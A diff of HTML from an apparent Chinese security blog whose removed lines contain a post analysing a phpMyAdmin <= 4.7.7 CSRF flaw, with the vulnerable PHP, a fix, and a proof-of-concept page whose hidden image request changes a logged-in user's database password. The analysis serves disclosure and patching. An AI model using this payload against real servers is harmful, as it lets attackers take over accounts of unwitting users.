@@ -16,7 +16,7 @@
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     <meta name="google-site-verification" content="LjYNGqlZPALnNPPyA_Uvw22OVRlDOw2RInQz8sZX-Yk" />
-    <title>phpMyAdmin &lt;= 4.7.7 CSRF分析 · Lucifaer&#39;s Blog</title>
+    <title>Lucifaer&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -71,8 +71,6 @@
 
     <link rel="preload" href= /css/style.css?v=20180721 as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= /css/mobile.css?v=20180721 media="(max-width: 980px)">
-    
-    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -212,23 +210,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >Lucifaer&#39;s Blog.</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">phpMyAdmin <= 4.7.7 CSRF分析</a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>Lucifaer's Blog.</a>
 </header>
@@ -242,76 +229,24 @@
 
 
 
-height:50vh;
-
 >
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            phpMyAdmin 
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞分析">漏洞分析</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "PHP">PHP</a>
-    
-</div>
-                
-                
-                    <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">579</span> / Reading time: <span class="post-count">3 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/08/30</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -412,93 +347,43 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <p>同样也是一个鸡肋漏洞，产生原因在<code>Common.inc.php</code>核心类，感觉漏洞发现者是捡了一个漏洞…</p>
-<a id="more"></a>
-<h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>本周在Twitter上有一个较为热点的讨论话题，是有关phpMyAdmin &lt;=4.7.7版本的一个CSRF漏洞，漏洞存在于<code>common.inc.php</code>中，而笔者分析完后，发现这个更像是漏洞作者捡漏的一个漏洞。</p>
-<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>phpMyAdmin &lt;= 4.7.7</p>
-<h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>本文用phpMyAdmin 4.7.6进行分析。</p>
-<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>直接看漏洞本质，主要在于两个点：</p>
-<p>首先是位于<code>libraries/common.inc.php</code>中第375行到389行这一段代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (PMA_isValid($_POST[<span class="string">'token'</span>])) &#123;</span><br><span class="line">        $token_provided = <span class="keyword">true</span>;</span><br><span class="line">        $token_mismatch = ! @hash_equals($_SESSION[<span class="string">' PMA_token '</span>], $_POST[<span class="string">'token'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($token_mismatch) &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * We don't allow any POST operation parameters if the token is mismatched</span></span><br><span class="line"><span class="comment">         * or is not provided</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        $whitelist = <span class="keyword">array</span>(<span class="string">'ajax_request'</span>);</span><br><span class="line">        PMA\libraries\Sanitize::removeRequestVars($whitelist);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>有个关键点：如果发送的请求是<code>GET</code>请求，就可以绕过对于参数的检测。</p>
-<p>其次，第二个漏洞触发的关键点在<code>sql.php</code>第72行到76行：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_GET[<span class="string">'sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_GET[<span class="string">'sql_query'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到这边可以直接接受外部<code>GET</code>请求的参数，在190行到199行处直接执行：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($goto == <span class="string">'sql.php'</span>) &#123;</span><br><span class="line">    $is_gotofile = <span class="keyword">false</span>;</span><br><span class="line">    $goto = <span class="string">'sql.php'</span> . URL::getCommon(</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'db'</span> =&gt; $db,</span><br><span class="line">            <span class="string">'table'</span> =&gt; $table,</span><br><span class="line">            <span class="string">'sql_query'</span> =&gt; $sql_query</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>如上所说，我们只需要构造一个页面该页面在用户点击的时候自动发一个<code>GET</code>请求就ok了。</p>
-<p>我在漏洞利用这边举一个利用csrf修改当前用户密码的例子。</p>
-<p>构造一个HTML：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>POC TEST<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://localhost:8888/sql.php?db=mysql&amp;table=user&amp;sql_query=SET password = PASSWORD('vul_test')"</span> <span class="attr">style</span>=<span class="string">"display:none"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>之后诱导已经登录phpMyAdmin的用户访问，当前用户的密码就已经改为<code>vul_test</code>了。</p>
-<h1 id="0x04-修复方法"><a href="#0x04-修复方法" class="headerlink" title="0x04 修复方法"></a>0x04 修复方法</h1><p>最简单的修补方式就是将<code>sql.php</code>中：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_GET[<span class="string">'sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_GET[<span class="string">'sql_query'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>改成：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_POST[<span class="string">'sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'sql_query'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>同样，直接更新到最新版是更好的方法。</p>
-
-    </article>
-    <!-- license  -->
+            <main class="main index-page">
     
-        <div class="license-wrapper">
-            <p>原文作者: <a href="https://lucifaer.com">Lucifaer</a>
-            <p>原文链接: <a href="https://lucifaer.com/2018/08/30/phpMyAdmin <= 4.7.7 CSRF分析/">https://lucifaer.com/2018/08/30/phpMyAdmin <= 4.7.7 CSRF分析/</a>
-            <p>发表日期: <a href="https://lucifaer.com/2018/08/30/phpMyAdmin <= 4.7.7 CSRF分析/">August 30th 2018, 8:01:00 pm</a>
-            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/03/10/Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）/" >
+            
+                <span>Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）</span>
+        </a>
+        <div class="abstract-content">
+            <p>这个利用链看着很简单，实际上很难挖，值得好好研究和学习。</p>
         </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/10</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞分析">漏洞分析</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Java">Java</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Weblogic">Weblogic</a>
+    
+</div>
+            
+        </div>
+    </article>
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/11/29/JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667）/" title= JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667） >
-                    <div class="nextTitle">JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667）</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/08/29/Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729)/" title= Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729) >
-                    <div class="prevTitle">Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729)</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-    <div id="lv-container" data-id="city" data-uid= MTAyMC8zODcyOC8xNTI1Ng==>
-        <script type="text/javascript">
-            (function(d, s) {
-                var j, e = d.getElementsByTagName(s)[0];
-         
-                if (typeof LivereTower === 'function') { return; }
-         
-                j = d.createElement(s);
-                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-                j.async = true;
-         
-                e.parentNode.insertBefore(j, e);
-            })(document, 'script');
-             </script>
-         <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
-    </div>
-
-<!-- City版安装代码已完成 -->
     
-    
-    <!--PC和WAP自适应版-->
-
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -580,24 +465,6 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-漏洞简述"><span class="toc-number">1.</span> <span class="toc-text">0x00 漏洞简述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞信息"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞影响版本"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞影响版本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞复现"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-修复方法"><span class="toc-number">5.</span> <span class="toc-text">0x04 修复方法</span></a></li></ol>
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1534,8 +1401,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
